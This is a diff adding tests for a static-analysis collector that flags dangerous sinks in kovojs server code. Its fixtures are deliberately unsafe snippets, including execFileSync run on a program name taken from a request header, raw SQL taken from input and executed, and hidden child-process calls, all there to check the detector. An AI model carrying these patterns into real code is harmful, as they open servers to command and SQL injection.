+      [directImport, '{ tables: APP_TABLES }', ''],
+      [directImport, '{ seed: APP_SEED, tables: makeTables() }', ''],
+      [directImport, '{ seed: APP_SEED, tables: APP_TABLES }', `APP_TABLES.push(contacts);`],
+      [
+        directImport,
+        '{ seed: APP_SEED, tables: APP_TABLES }',
+        `function getTables() { return APP_TABLES; } getTables().push(contacts);`,
+      ],
+      [
+        directImport,
+        '{ seed: APP_SEED, tables: APP_TABLES }',
+        `function getSeed() { return APP_SEED; } getSeed()[0].rows.push({ id: 'c2' });`,
+      ],
+      [
+        directImport,
+        '{ seed: APP_SEED, tables: APP_TABLES }',
+        `let escaped; escaped = APP_TABLES; escaped.push(contacts);`,
+      ],
+      [
+        directImport,
+        '{ seed: APP_SEED, tables: APP_TABLES }',
+        `const holder = {}; holder.value = APP_TABLES; holder.value.push(contacts);`,
+      ],
+      [
+        directImport,
+        '{ seed: APP_SEED, tables: APP_TABLES }',
+        `class Tables { get value() { return APP_TABLES; } } new Tables().value.push(contacts);`,
+      ],
+      [
+        directImport,
+        '{ seed: APP_SEED, tables: APP_TABLES }',
+        `function* seeds() { yield APP_SEED; } seeds().next().value[0].rows.push({ id: 'c2' });`,
+      ],
+      [
+        directImport,
+        '{ seed: APP_SEED, tables: APP_TABLES }',
+        `class StaticHolder { static value = APP_TABLES; } StaticHolder.value[0] = contacts;`,
+      ],
+      [
+        directImport,
+        '{ seed: APP_SEED, tables: APP_TABLES }',
+        `class Holder { value = APP_SEED; } new Holder().value[0].rows[0] = { id: 'c2' };`,
+      ],
+      [
+        directImport,
+        '{ seed: APP_SEED, tables: APP_TABLES }',
+        `class Box { constructor(value) { this.value = value; } } new Box(APP_TABLES);`,
+      ],
+    ] as const) {
+      const facts = sinksFor(source(constructor, options, mutation));
+      expect(facts.length, `${constructor}\n${options}\n${mutation}`).toBeGreaterThan(0);
+      if (
+        mutation.includes('getTables') ||
+        mutation.includes('getSeed') ||
+        mutation.includes('escaped') ||
+        mutation.includes('holder') ||
+        mutation.includes('class Tables') ||
+        mutation.includes('function* seeds') ||
+        mutation.includes('class StaticHolder') ||
+        mutation.includes('class Holder') ||
+        mutation.includes('new Box')
+      ) {
+        expect(facts, mutation).toEqual(
+          expect.arrayContaining([
+            expect.objectContaining({
+              sink: 'request-handler.opaque-call',
+              source: 'createSqliteAppRuntime',
+            }),
+          ]),
+        );
+      }
+    }
+
+    const helperWrappedRuntime = sinksFor(`
+      import { execFileSync } from 'node:child_process';
+      import { createApp } from '@kovojs/server';
+      import { createSqliteAppRuntime } from '@kovojs/server/sqlite';
+      import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
+      const contacts = sqliteTable('contacts', { id: text('id').primaryKey() });
+      const APP_TABLES = [contacts];
+      const APP_SEED = [];
+      function makeRuntime() {
+        execFileSync('runtime-wrapper');
+        return createSqliteAppRuntime({ seed: APP_SEED, tables: APP_TABLES });
+      }
+      export default createApp({
+        db: makeRuntime().db,
+        routes: [],
+      });
+    `);
+    expect(helperWrappedRuntime).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          sink: 'request-handler.opaque-source',
+          source: '<opaque-retained-config-derivation>',
+        }),
+      ]),
+    );
+  });
+
+  it('keeps generated database and auth setup constructors at module initialization', () => {
+    const sqliteFacts = sinksForFiles([
+      {
+        fileName: 'schema.ts',
+        source: `
+          import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
+          export const contacts = sqliteTable('contacts', { id: text('id').primaryKey() });
+        `,
+      },
+      {
+        fileName: '_kovo/unsafe.ts',
+        source: `
+          import { mutation, publicAccess } from '@kovojs/server';
+          import { createSqliteAppRuntime } from '@kovojs/server/sqlite';
+          import * as schema from '../schema.js';
+          const APP_TABLES = [schema.contacts];
+          const APP_SEED = [{ table: schema.contacts, rows: [{ id: 'c1' }] }];
+          export const unsafe = mutation({
+            access: publicAccess('fixture'),
+            handler() {
+              const runtime = createSqliteAppRuntime({ seed: APP_SEED, tables: APP_TABLES });
+              void runtime;
+              return null;
+            },
+          });
+        `,
+      },
+    ]);
+    expect(sqliteFacts).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          sink: 'request-handler.opaque-call',
+          source: 'createSqliteAppRuntime',
+        }),
+      ]),
+    );
+
+    const postgresFacts = sinksFor(`
+      import { createPostgresAppRuntimeDb, mutation, publicAccess } from '@kovojs/server';
+      export const unsafe = mutation({
+        access: publicAccess('fixture'),
+        handler(input) {
+          return createPostgresAppRuntimeDb({
+            databaseUrl: input.databaseUrl,
+            dataDir: input.dataDir,
+            driver: input.driver,
+            schema: input.schema,
+          });
+        },
+      });
+    `);
+    expect(postgresFacts).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          sink: 'request-handler.opaque-call',
+          source: 'createPostgresAppRuntimeDb',
+        }),
+      ]),
+    );
+
+    const hostilePrincipalMapper = sinksFor(`
+      import { execFileSync } from 'node:child_process';
+      import { createPostgresAppRuntimeDb } from '@kovojs/server';
+      export const runtime = createPostgresAppRuntimeDb({
+        schema: {},
+        principalFromRequest(request) {
+          execFileSync(request.headers.get('x-program'));
+          return request.headers.get('x-user') ?? undefined;
+        },
+      });
+    `);
+    expect(hostilePrincipalMapper).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ sink: 'child_process.execFileSync' }),
+        expect.objectContaining({
+          sink: 'request-handler.opaque-call',
+          source: 'createPostgresAppRuntimeDb',
+        }),
+      ]),
+    );
+  });
+
+  it('does not grant app code raw Postgres DB authority through the internal subpath', () => {
+    const facts = sinksFor(`
+      import { query } from '@kovojs/server';
+      import { usePostgresAppRuntimeDb } from '@kovojs/server/internal/postgres-capability';
+      const forgedRuntime = {};
+      export const unsafe = query({ load(input) {
+        const rawDb = usePostgresAppRuntimeDb(forgedRuntime, input);
+        return rawDb.execute(input.sql);
+      } });
+    `);
+    expect(facts).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          sink: 'request-handler.opaque-source',
+          source: '<opaque-module-initializer:@kovojs/server/internal/postgres-capability>',
+        }),
+        expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'rawDb.execute' }),
+      ]),
+    );
   });
 
   it('accepts only the exact static generated client-module registry grammar', () => {
@@ -5582,6 +6700,27 @@ describe('@kovojs/drizzle dangerous-sink collector (KV424, conservative)', () =>
   });
 
   it('does not turn reviewed JSX helper results or UI descriptors into ambient capabilities', () => {
+    const helperArgumentCarriers = sinksFor(`
+      import { execFileSync } from 'node:child_process';
+      import { mutation, mutationFormAttributes, publicAccess } from '@kovojs/server';
+      export const unsafe = mutation({ access: publicAccess('fixture'), handler() {
+        const callbackCarrier = { run() { return execFileSync('helper-callback'); } };
+        const getterCarrier = { get mutation() { return execFileSync('helper-getter'); } };
+        const proxyCarrier = new Proxy({}, {
+          get() { return execFileSync('helper-proxy'); },
+        });
+        mutationFormAttributes(callbackCarrier);
+        mutationFormAttributes(getterCarrier);
+        mutationFormAttributes(proxyCarrier);
+        return null;
+      } });
+    `);
+    expect(
+      helperArgumentCarriers
+        .filter(({ sink }) => sink === 'child_process.execFileSync')
+        .map(({ source }) => source),
+    ).toEqual(expect.arrayContaining(["'helper-callback'", "'helper-getter'", "'helper-proxy'"]));
+
     const helperResults = sinksFor(`
       import { mutation, mutationFormAttributes, publicAccess } from '@kovojs/server';
       import * as style from '@kovojs/style';
